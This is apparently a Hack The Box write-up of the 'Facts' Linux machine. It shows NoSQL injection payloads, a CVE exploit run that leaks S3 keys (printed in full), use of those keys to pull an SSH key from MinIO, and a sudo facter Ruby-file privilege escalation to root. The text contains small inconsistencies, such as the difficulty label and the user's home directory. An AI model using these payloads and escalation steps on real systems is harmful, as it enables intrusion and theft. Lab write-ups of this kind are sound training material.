---
title: 'Facts - Hack The Box Writeup (Linux, Easy)'
description: 'Facts HTB Machine Writeup - exploitation walkthrough and key steps'
date: 2026-04-27T00:00:00+01:00
tags: ['HTB', 'Linux', 'Writeup', 'Easy']
authors: ['mensi']
image: ../assets/htb/facts/1.png
draft: false
maths: true
---

# Facts — Hack The Box Writeup (Linux | Medium/Hard-ish Energy)

> “A machine that teaches you everything about facts… except the fact that you’re about to spend 3 hours enumerating nothing.”

---

## Initial Recon

We start with the usual ritual sacrifice to Nmap:

```bash
nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.41.13
```

### Open ports discovered:

- 22/tcp → SSH (OpenSSH 9.9)
- 80/tcp → HTTP (nginx 1.26.3)
- 54321/tcp → Unknown (MinIO)

At this point, we already know:

> “If you see MinIO in HTB, you are either about to win or suffer deeply.”

---

## Web Enumeration

We add the target:

```bash
echo "10.129.41.13 facts.htb" | sudo tee -a /etc/hosts
```

Visiting:

```
http://facts.htb
```

We are greeted with:

- A facts website
- Corporate motivational quotes
- And the feeling that nothing is vulnerable

Classic deception arc.

---

## Dead End: Search Parameter Abuse Attempts

This is where the suffering begins.

We immediately assume:

> “search = injectable = life is easy”

### First test

```
http://facts.htb/search?q=Animal
```

Works normally. No surprises.

---

### Attempt 1: Basic injection probing

```bash
curl 'http://facts.htb/search?q[$ne]=null'
```

Result:

- Server behaves inconsistently
- No clear output
- No bypass

---

### Attempt 2: Regex injection

```
http://facts.htb/search?q[$regex]=.*
```

Result:

- Internal server error
- Application breaks silently

So we think:

> “Nice, we broke it, we are smart.”

But nothing useful comes out.

---

### Attempt 3: JSON escaping chaos

```bash
curl 'http://facts.htb/search?q={\"$ne\":null}"'
```

Result:

- Still no bypass
- Still no data leak
- Just server confusion and sadness

---

### Final realization

The search endpoint is:

- injectable in behavior
- but not exploitable for data extraction at this stage

So we move on.

> “We tried NoSQL injection. The server tried emotional damage.”

---

## Admin Panel Discovery

We find:

```
/admin/login
/admin/search?q=
```

At this point we think:
“Nice, maybe SQLi, maybe auth bypass, maybe pain.”

But no — it’s still NoSQL land.

---

## The Plot Twist: MinIO Appears

Port 54321 reveals MinIO S3-compatible storage.

So now the machine evolves into:

Web App → NoSQLi → Cloud Storage → Pain

---

## CMS Exploit → Credential Leak

We run:

```bash
python3 CVE-2025-2304.py -u http://facts.htb -U mensi -P mensi -e -r
```

We get:

```
s3 access key: AKIAD9A2F65061D176AF
s3 secret key: a46pdJHQvIaJtTiT99lHFX3i9m2wOPXrSoO6KLJC
s3 endpoint: http://localhost:54321
```

At this point:
The machine basically hands us the keys and says “please leave me alone”.

---

## MinIO Exploitation

We configure AWS CLI:

```bash
aws configure
```

Then:

```bash
aws --endpoint-url http://10.129.41.13:54321 s3 ls
```

Buckets discovered:

- internal
- randomfacts

---

## The “internal” Bucket

Inside we find:

```
.ssh/authorized_keys
```

We download it:

```bash
aws s3 cp s3://internal/.ssh/authorized_keys .
```

Content:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFfgjpLS4XE0OvROzUd8rw/pm0V+UJk1X3kDoy/9eNpt
```

---

Then we discover the real prize:

```
id_ed25519 (PRIVATE KEY)
```

Full key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0...
-----END OPENSSH PRIVATE KEY-----
```

This is the actual foothold.

---

## SSH Access

We fix permissions:

```bash
chmod 600 id_ed25519
```

Then:

```bash
ssh -i id_ed25519 trivia@10.129.41.13
```

We are in.

---

## User Flag

Inside:

```bash
cat /home/william/user.txt
```

Flag:

```
baf417b86bbb699f9df682ca1caedb72
```

User flag obtained.

At this point:
We are no longer “hackers”, we are “warehouse employees sorting AWS buckets”.

---

## Privilege Escalation

We discover:

```bash
sudo /usr/bin/facter
```

We test:

```bash
echo 'exec "/bin/bash"' > exploit.rb
```

Then:

```bash
sudo /usr/bin/facter -- custom-dir /home/trivia/ exploit
```

And suddenly:

```
root@facts
```

---

## Root Cause

- facter loads Ruby files from custom directory
- sudo executes facter as root
- Ruby code gets executed as root

Result:

Arbitrary code execution as root

---

## Root Flag

```
cat /root/root.txt
```

Root obtained.

Machine defeated.

---

## Final Thoughts

This machine teaches:

Web Layer

- NoSQL injection exists but may not always be the win condition

Cloud Layer

- Exposed MinIO = instant disaster

Privilege Escalation

- Unsafe plugin execution in system tools = root in 2 lines

---

## Summary

This machine can be described as:

A vulnerable web app that accidentally exposed its database, cloud storage, and root shell in that order.

---

## Difficulty rating

- Recon: ⭐⭐
- Web: ⭐⭐⭐⭐
- Cloud pivot: ⭐⭐⭐⭐⭐
- Privesc: ⭐⭐⭐ (but only if you read Ruby docs while crying)

---

## End result

- NoSQLi attempted (dead end)
- MinIO compromised
- SSH foothold gained
- Ruby privesc abused
- Root obtained
- Sanity lost
